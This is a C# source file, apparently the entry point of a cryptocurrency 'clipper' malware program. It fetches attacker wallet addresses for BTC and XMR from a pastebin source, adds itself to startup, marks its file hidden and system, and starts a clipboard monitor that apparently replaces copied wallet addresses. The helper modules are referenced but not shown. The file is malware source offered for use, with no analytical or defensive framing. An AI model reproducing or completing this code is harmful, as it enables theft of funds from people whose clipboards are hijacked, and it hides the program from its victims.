using System;

namespace Clipper
{
    class Program
    {
        // Example pastebin
        // btc sameBTCaddres
        // xmr someXMRAddres
        public static string pastebinSource = "dungeon master";
        [STAThreadAttribute]
        static void Main()
        {
            // Pastebin part
            using (WebClient wc = new WebClient())
            {
                string allPassetbin = wc.DownloadString(pastebinSource);
                string[] vsSS = allPassetbin.Split('\n');
                foreach (String lockS in vsSS)
                {
                    string[] parsed = lockS.Split();
                    config.addresses[parsed[0]] = parsed[1];
                }
            }
             // Check mutex
             Modules.AppMutex.Check();
            // Add to startup
            if (!Modules.Autorun.is_installed())
                Modules.Autorun.install();
            // Set hidden & system attributes
            Modules.Attributes.set_hidden();
            Modules.Attributes.set_system();
            // Start clipper
            Modules.ClipboardMonitor.run();
        }
    }
}
